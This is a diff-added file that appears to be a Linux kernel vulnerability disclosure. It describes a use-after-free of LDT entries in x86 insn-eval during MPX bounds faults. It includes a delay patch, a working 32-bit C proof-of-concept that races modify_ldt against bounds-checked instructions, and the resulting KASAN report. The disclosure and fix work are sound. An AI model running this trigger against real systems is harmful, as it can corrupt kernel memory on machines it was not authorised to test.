@@ -1,0 +1,224 @@
+/*
+When a #BR exception is raised because of an MPX bounds violation, Linux parses
+the faulting instruction and computes the linear address of its memory operand.
+If the userspace instruction is in 32-bit code, this involves looking up the
+correct segment descriptor and adding the segment offset to the address.
+
+(Another codepath that computes the linear address of an instruction is UMIP,
+but I think that requires processors >= Cannon Lake, and my PC isn't that new.)
+
+get_desc() locks the mm context, computes the pointer to the LDT entry, but then
+drops the lock again and returns the pointer. This means that when the caller
+actually accesses the pointer, the pointer may have been freed already.
+
+This bug was introduced in
+<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=670f928ba09b>
+("x86/insn-eval: Add utility function to get segment descriptor", first in 4.15).
+
+
+To make this easier to hit, I patched a sleep into my kernel:
+
+
+================
+diff --git a/arch/x86/lib/insn-eval.c b/arch/x86/lib/insn-eval.c
+index cf00ab6c66210..5d9c59a28c76f 100644
+--- a/arch/x86/lib/insn-eval.c
++++ b/arch/x86/lib/insn-eval.c
+@@ -7,6 +7,7 @@
+ #include <linux/string.h>
+ #include <linux/ratelimit.h>
+ #include <linux/mmu_context.h>
++#include <linux/delay.h>
+ #include <asm/desc_defs.h>
+ #include <asm/desc.h>
+ #include <asm/inat.h>
+@@ -670,6 +671,8 @@ unsigned long insn_get_seg_base(struct pt_regs *regs, int seg_reg_idx)
+        if (!desc)
+                return -1L;
+ 
++       mdelay(1000);
++
+        return get_desc_base(desc);
+ }
+================
+
+I also built the kernel with KASAN and full preemption.
+
+
+Then I ran the following test program, compiled with
+"gcc -m32 -mmpx -fcheck-pointer-bounds -o mpx mpx.c -pthread":
+
+===============
+*/
+
+#define _GNU_SOURCE
+#include <ucontext.h>
+#include <stdio.h>
+#include <signal.h>
+#include <setjmp.h>
+#include <sys/prctl.h>
+#include <err.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <asm/ldt.h>
+#include <pthread.h>
+
+unsigned long blah;
+
+void post_bounds_label(void);
+
+static void do_ldt(void) {
+  struct user_desc desc = {
+    .entry_number = 0,
+    .base_addr = (unsigned long)&blah,
+    .limit = 0xffffffff,
+    .seg_32bit = 1,
+    .contents = 0,
+    .useable = 1
+  };
+  if (syscall(__NR_modify_ldt, 0x11, &desc, sizeof(desc)))
+    err(1, "modify_ldt");
+}
+
+void *ldt_thread(void *dummy) {
+  while (1) do_ldt();
+}
+
+jmp_buf jumpy;
+void handle_segv(int sig, siginfo_t *info, void *uctx_) {
+  if (info->si_addr != &blah) {
+    printf("addr=%p\n", info->si_addr);
+  }
+  ucontext_t *uctx = uctx_;
+  uctx->uc_mcontext.gregs[REG_EIP] = (unsigned long)post_bounds_label;
+}
+
+int main(void) {
+  do_ldt();
+  pthread_t thread;
+  if (pthread_create(&thread, NULL, ldt_thread, NULL)) err(1, "pthread create");
+
+  struct sigaction act = {
+    .sa_sigaction = handle_segv,
+    .sa_flags = SA_NODEFER|SA_SIGINFO
+  };
+  if (sigaction(SIGSEGV, &act, NULL)) err(1, "sigaction");
+
+  while (1) {
+    unsigned long mpx_bounds[2] = { 5, 6 };
+    unsigned long old_bounds[2];
+    asm volatile(
+      "bndmov %%bnd0, (%0)\n"
+      "bndmov (%2), %%bnd0\n"
+      "mov %1, %%fs\n"
+      "bndcl %%fs:(%3), %%bnd0\n"
+      "bndcn %%fs:(%3), %%bnd0\n"
+      "post_bounds_label:\n"
+      "bndmov (%0), %%bnd0\n"
+    : /*out*/
+    : /*in*/
+      "r"(old_bounds),
+      "r"(0x7),
+      "r"(mpx_bounds),
+      "r"(0x0UL)
+    );
+  }
+}
+/*
+jannh@laptop:~/mpx$ 
+===============
+
+The program started printing various hex numbers, and I immediately got this
+KASAN splat:
+
+===============
+[ 3129.003397] ==================================================================
+[ 3129.003411] BUG: KASAN: use-after-free in insn_get_seg_base+0x9a/0x110
+[ 3129.003416] Read of size 2 at addr ffff8883775da002 by task mpx/13947
+
+[ 3129.003425] CPU: 1 PID: 13947 Comm: mpx Not tainted 5.2.0-rc2+ #10
+[ 3129.003427] Hardware name: [...]
+[ 3129.003429] Call Trace:
+[ 3129.003436]  dump_stack+0x71/0xab
+[ 3129.003441]  ? insn_get_seg_base+0x9a/0x110
+[ 3129.003446]  print_address_description+0x6a/0x250
+[ 3129.003450]  ? insn_get_seg_base+0x9a/0x110
+[ 3129.003454]  ? insn_get_seg_base+0x9a/0x110
+[ 3129.003458]  __kasan_report+0x14e/0x192
+[ 3129.003463]  ? insn_get_seg_base+0x9a/0x110
+[ 3129.003467]  kasan_report+0xe/0x20
+[ 3129.003471]  insn_get_seg_base+0x9a/0x110
+[ 3129.003476]  get_seg_base_limit+0x181/0x4a0
+[ 3129.003482]  insn_get_addr_ref+0x18f/0x490
+[ 3129.003486]  ? insn_get_opcode.part.4+0x16d/0x350
+[ 3129.003490]  ? insn_get_modrm_rm_off+0x60/0x60
+[ 3129.003496]  ? insn_get_modrm.part.5+0xce/0x220
+[ 3129.003501]  ? insn_get_sib.part.6+0x60/0xc0
+[ 3129.003505]  ? insn_get_displacement.part.7+0xe3/0x1d0
+[ 3129.003509]  ? insn_get_immediate.part.8+0x52/0x710
+[ 3129.003514]  ? preempt_count_sub+0x14/0xc0
+[ 3129.003517]  ? preempt_count_sub+0x14/0xc0
+[ 3129.003523]  mpx_fault_info+0x1bc/0x2d0
+[ 3129.003528]  ? trace_event_raw_event_bounds_exception_mpx+0x170/0x170
+[ 3129.003535]  ? notify_die+0x7d/0xc0
+[ 3129.003539]  ? atomic_notifier_call_chain+0x40/0x40
+[ 3129.003543]  ? __ia32_sys_rt_sigaction+0x1c0/0x1c0
+[ 3129.003547]  ? preempt_count_sub+0x14/0xc0
+[ 3129.003550]  ? preempt_count_sub+0x14/0xc0
+[ 3129.003556]  do_bounds+0x24d/0x350
+[ 3129.003560]  ? do_double_fault+0x160/0x160
+[ 3129.003565]  ? fpregs_assert_state_consistent+0x54/0x70
+[ 3129.003570]  ? bounds+0xa/0x20
+[ 3129.003574]  bounds+0x14/0x20
+[ 3129.003578] RIP: 0023:0x565e98e7
+[ 3129.003583] Code: c7 85 64 ff ff ff 06 00 00 00 8d 85 58 ff ff ff b9 07 00 00 00 8d 95 60 ff ff ff bb 00 00 00 00 66 0f 1b 00 66 0f 1a 02 8e e1 <64> f3 0f 1a 03 64 f2 0f 1b 03 66 0f 1a 00 f2 e9 7c ff ff ff 55 89
+[ 3129.003585] RSP: 002b:00000000ffdca1f0 EFLAGS: 00010286
+[ 3129.003588] RAX: 00000000ffdca230 RBX: 0000000000000000 RCX: 0000000000000007
+[ 3129.003591] RDX: 00000000ffdca238 RSI: 0000000000000001 RDI: 00000000ffdca2cc
+[ 3129.003593] RBP: 00000000ffdca2d8 R08: 0000000000000000 R09: 0000000000000000
+[ 3129.003595] R10: 0000000000000000 R11: 0000000000000286 R12: 0000000000000000
+[ 3129.003597] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+
+[ 3129.003606] Allocated by task 13948:
+[ 3129.003611]  save_stack+0x19/0x80
+[ 3129.003615]  __kasan_kmalloc.constprop.8+0xa0/0xd0
+[ 3129.003618]  kmem_cache_alloc_trace+0xcc/0x5d0
+[ 3129.003622]  alloc_ldt_struct+0x39/0xc0
+[ 3129.003625]  write_ldt+0x236/0x5d0
+[ 3129.003628]  __ia32_sys_modify_ldt+0x50/0xc0
+[ 3129.003632]  do_fast_syscall_32+0x112/0x390
+[ 3129.003635]  entry_SYSENTER_compat+0x7f/0x91
+
+[ 3129.003639] Freed by task 13948:
+[ 3129.003644]  save_stack+0x19/0x80
+[ 3129.003647]  __kasan_slab_free+0x105/0x150
+[ 3129.003650]  kfree+0x82/0x120
+[ 3129.003653]  write_ldt+0x519/0x5d0
+[ 3129.003656]  __ia32_sys_modify_ldt+0x50/0xc0
+[ 3129.003659]  do_fast_syscall_32+0x112/0x390
+[ 3129.003664]  entry_SYSENTER_compat+0x7f/0x91
+
+[ 3129.003669] The buggy address belongs to the object at ffff8883775da000
+                which belongs to the cache kmalloc-32 of size 32
+[ 3129.003674] The buggy address is located 2 bytes inside of
+                32-byte region [ffff8883775da000, ffff8883775da020)
+[ 3129.003677] The buggy address belongs to the page:
+[ 3129.003683] page:ffffea000ddd7680 refcount:1 mapcount:0 mapping:ffff8883d0c00180 index:0xffff8883775dafc1
+[ 3129.003686] flags: 0x17fffc000000200(slab)
+[ 3129.003692] raw: 017fffc000000200 ffffea000f0692c8 ffffea000d4bb988 ffff8883d0c00180
+[ 3129.003696] raw: ffff8883775dafc1 ffff8883775da000 000000010000003f 0000000000000000
+[ 3129.003698] page dumped because: kasan: bad access detected
+
+[ 3129.003701] Memory state around the buggy address:
+[ 3129.003706]  ffff8883775d9f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[ 3129.003711]  ffff8883775d9f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[ 3129.003715] >ffff8883775da000: fb fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
+[ 3129.003718]                    ^
+[ 3129.003723]  ffff8883775da080: fb fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
+[ 3129.003727]  ffff8883775da100: fb fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
+[ 3129.003730] ==================================================================
+[ 3129.003733] Disabling lock debugging due to kernel taint
+===============
+
+I'll send a suggested patch ("[PATCH] x86/insn-eval: Fix use-after-free access to LDT entry") in a minute.
+*/
